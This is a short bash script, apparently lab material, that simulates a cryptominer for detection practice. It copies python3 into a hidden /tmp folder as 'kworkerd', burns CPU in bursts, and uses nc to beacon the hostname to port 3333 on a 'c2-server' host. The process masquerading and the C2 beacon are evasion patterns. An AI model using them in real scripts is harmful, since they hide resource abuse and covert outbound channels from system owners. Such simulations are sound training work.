#!/bin/bash
# SIMULATED cryptominer (lab only): a renamed copy of python3 in a hidden /tmp folder burns CPU
# in 3-second bursts and sends a "share" to a fake pool port on the lab c2-server.
# No mining happens.
# Usage: miner.sh <seconds>
set -u
END=$(( SECONDS + ${1:-300} ))
TICK="/tmp/.m-tick.$$"; mkfifo "$TICK" && exec 7<>"$TICK"
mkdir -p /tmp/.x && cp "$(command -v python3)" /tmp/.x/kworkerd && chmod +x /tmp/.x/kworkerd

while (( SECONDS < END )); do
  /tmp/.x/kworkerd -c "import time
t = time.time()
while time.time() - t < 3: pass"
  echo "share $HOSTNAME $RANDOM" | nc -w 1 c2-server 3333 > /dev/null 2>&1
  read -r -t 1 -u 7 _ || true
done
rm -rf /tmp/.x "$TICK"
